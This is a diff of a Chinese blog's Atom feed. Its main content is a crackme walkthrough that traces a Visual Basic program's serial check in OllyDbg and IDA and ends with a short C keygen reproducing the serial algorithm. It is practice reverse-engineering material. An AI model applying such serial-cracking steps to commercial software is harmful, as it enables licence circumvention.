+    <content type="html"><![CDATA[<p>###步骤如下</p><p>1  .程序链接    <a href="http://pan.baidu.com/s/1bSPUdK" target="_blank" rel="external">http://pan.baidu.com/s/1bSPUdK</a></p><p>2.这是一个vb程序，ida不能看出什么，只能靠OD了。首先打开程序查看界面以及填入name和serial后的弹出的关键字符串。</p><p>3.打开OD，定位关键字符串的位置，然后寻找关键跳转，发现是在0040258b的位置，往前看是test esi，esi 。</p><p><img src="http://i.imgur.com/zNx08T2.png" alt=""></p><p>寻找一下esi的来源，发现时00402533位置的比较字符串函数的返回值，在此处下断点，在堆栈中发现了两个字符串AKA-585235和111111，一个是我们输入的serial,另一个应该我输入的name处理后的结果，继续向上寻找这个字符串的来源。在00402523位置的函数时一个字符串连接函数，把AKA和585235连接在一起，</p><p><img src="http://i.imgur.com/L7OC3u0.png" alt=""></p><p>继续往前找585235的位置，发现在4024f4d处的函数调用以后，在堆栈中出现了585235，记下它的地址0014e3dc，</p><p><img src="http://i.imgur.com/XvyRwWc.png" alt=""></p><p>重新运行程序到004024f4的位置，在内存区设置0014e3dc位置设置内存访问断点，然后运行程序，</p><p><img src="http://i.imgur.com/6LollUw.png" alt=""></p><p>程序停在了7c84c3A1的位置，查看堆栈，发现出现了585235字符，记下它的地址008fbc80,</p><p><img src="http://i.imgur.com/xWA8wmF.png" alt=""></p><p>然后重新运行程序，停在004024f4的位置，查看内存008fbc80的内容，发现还不是585235，然后f9运行直到找到对其赋值的位置，记下此时的地址，0014db00,</p><p><img src="http://i.imgur.com/KF1WoYi.png" alt=""></p><p>然后重新运行程序到004024f4的位置，在内存区寻找这个位置发现是585235，</p><p><img src="http://i.imgur.com/SM4q3Fu.png" alt=""></p><p>继续往前找寻找它的来源，在004024c1的位置下断点，看一下此时它的数据是否有所变化，下面我的灵感来源于我对程序测试的结果，在程序中name输入123456和111111，serial都是585235，刚开始我以为这是一个固定的字符串，后来我输入1234567的时候，发现不一样了，于是我想着去找一下获取字符串长度的函数。在IDA中找到函数<strong>vbaLenBstr，记下它的地址，在OD中找到这个位置00402415，返回值eax是5，然后后面就是eax乘以0x17cfb赋给edi，然后调用rtcansivaluebstr函数，网上查资料该函数是获取第一个字符的ascii值，得到eax=0x31即ax=31,最后得到edi的值为6*0x17cfb+0x31=0x8ee13,然后程序调用</strong>vbastri4函数，即把十进制数转变为字符串即0x8ee13的十进制数位585235，转变为字符串“585235”，然后就得到这个585235，到此整个流程就很清楚了。</p><p><img src="http://i.imgur.com/s7GXTIj.png" alt=""></p><p>   4.转化为c代码为：</p><pre><code>#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;int main(){    char name[10];    int len=0,key=0;    scanf(&quot;%s&quot;,&amp;name);    len=strlen(name);    key=len*0x17cfb+name[0];    printf(&quot;AKA-&quot;);    printf(&quot;%d\n&quot;,key);    system(&quot;pause&quot;);    return 0;}</code></pre>]]></content>
     
     <summary type="html">
     
       
       
         &lt;p&gt;###步骤如下&lt;/p&gt;
-&lt;p&gt;1.分析样本来源于恶意代码分析实战课后题目的样本,lab3-01.exe,链接就不贴了，百度一搜就可以搜到了。&lt;/p&gt;
-&lt;p&gt;2.首先在虚拟机里准备好必要的工具，静态分析工具包括PEView,strings,(IDA),Dependency W
+&lt;p&gt;1  .程序链接    &lt;a href=&quot;http://pan.baidu.com/s/1bSPUdK&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pan.baidu.com/s/1bSPUdK&lt;/a&gt;&lt;/p&gt;
       
     
     </summary>
     
-      <category term="恶意代码分析" scheme="http://18428381824.github.io/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
+      <category term="逆向" scheme="http://18428381824.github.io/categories/%E9%80%86%E5%90%91/"/>
     
     
-      <category term="恶意代码分析" scheme="http://18428381824.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"/>
+      <category term="逆向" scheme="http://18428381824.github.io/tags/%E9%80%86%E5%90%91/"/>
     
   </entry>
   
@@ -523,32 +549,6 @@ AX=0FF80H
       
         &lt;p&gt;###步骤如下&lt;/p&gt;
 &lt;p&gt;1.这个题目是迄今遇到的最坑题目。话不多说，上题目。链接：&lt;a href=&quot;http://pan.baidu.com/s/1hr5CtpU&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pan.baidu.com
-      
-    
-    </summary>
-    
-      <category term="逆向" scheme="http://18428381824.github.io/categories/%E9%80%86%E5%90%91/"/>
-    
-    
-      <category term="逆向" scheme="http://18428381824.github.io/tags/%E9%80%86%E5%90%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>一个简单的crackme</title>
-    <link href="http://18428381824.github.io/2017/08/01/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84crackme/"/>
-    <id>http://18428381824.github.io/2017/08/01/一个简单的crackme/</id>
-    <published>2017-07-31T16:00:00.000Z</published>
-    <updated>2017-08-02T13:57:37.472Z</updated>
-    
-    <content type="html"><![CDATA[<p>###步骤如下</p><p>1  .程序链接    <a href="http://pan.baidu.com/s/1bSPUdK" target="_blank" rel="external">http://pan.baidu.com/s/1bSPUdK</a></p><p>2.这是一个vb程序，ida不能看出什么，只能靠OD了。首先打开程序查看界面以及填入name和serial后的弹出的关键字符串。</p><p>3.打开OD，定位关键字符串的位置，然后寻找关键跳转，发现是在0040258b的位置，往前看是test esi，esi 。</p><p><img src="http://i.imgur.com/zNx08T2.png" alt=""></p><p>寻找一下esi的来源，发现时00402533位置的比较字符串函数的返回值，在此处下断点，在堆栈中发现了两个字符串AKA-585235和111111，一个是我们输入的serial,另一个应该我输入的name处理后的结果，继续向上寻找这个字符串的来源。在00402523位置的函数时一个字符串连接函数，把AKA和585235连接在一起，</p><p><img src="http://i.imgur.com/L7OC3u0.png" alt=""></p><p>继续往前找585235的位置，发现在4024f4d处的函数调用以后，在堆栈中出现了585235，记下它的地址0014e3dc，</p><p><img src="http://i.imgur.com/XvyRwWc.png" alt=""></p><p>重新运行程序到004024f4的位置，在内存区设置0014e3dc位置设置内存访问断点，然后运行程序，</p><p><img src="http://i.imgur.com/6LollUw.png" alt=""></p><p>程序停在了7c84c3A1的位置，查看堆栈，发现出现了585235字符，记下它的地址008fbc80,</p><p><img src="http://i.imgur.com/xWA8wmF.png" alt=""></p><p>然后重新运行程序，停在004024f4的位置，查看内存008fbc80的内容，发现还不是585235，然后f9运行直到找到对其赋值的位置，记下此时的地址，0014db00,</p><p><img src="http://i.imgur.com/KF1WoYi.png" alt=""></p><p>然后重新运行程序到004024f4的位置，在内存区寻找这个位置发现是585235，</p><p><img src="http://i.imgur.com/SM4q3Fu.png" alt=""></p><p>继续往前找寻找它的来源，在004024c1的位置下断点，看一下此时它的数据是否有所变化，下面我的灵感来源于我对程序测试的结果，在程序中name输入123456和111111，serial都是585235，刚开始我以为这是一个固定的字符串，后来我输入1234567的时候，发现不一样了，于是我想着去找一下获取字符串长度的函数。在IDA中找到函数<strong>vbaLenBstr，记下它的地址，在OD中找到这个位置00402415，返回值eax是5，然后后面就是eax乘以0x17cfb赋给edi，然后调用rtcansivaluebstr函数，网上查资料该函数是获取第一个字符的ascii值，得到eax=0x31即ax=31,最后得到edi的值为6*0x17cfb+0x31=0x8ee13,然后程序调用</strong>vbastri4函数，即把十进制数转变为字符串即0x8ee13的十进制数位585235，转变为字符串“585235”，然后就得到这个585235，到此整个流程就很清楚了。</p><p><img src="http://i.imgur.com/s7GXTIj.png" alt=""></p><p>   4.转化为c代码为：</p><pre><code>#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;int main(){    char name[10];    int len=0,key=0;    scanf(&quot;%s&quot;,&amp;name);    len=strlen(name);    key=len*0x17cfb+name[0];    printf(&quot;AKA-&quot;);    printf(&quot;%d\n&quot;,key);    system(&quot;pause&quot;);    return 0;}</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;###步骤如下&lt;/p&gt;
-&lt;p&gt;1  .程序链接    &lt;a href=&quot;http://pan.baidu.com/s/1bSPUdK&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://pan.baidu.com/s/1bSPUdK&lt;/a&gt;&lt;/p&gt;
       
     
     </summary>
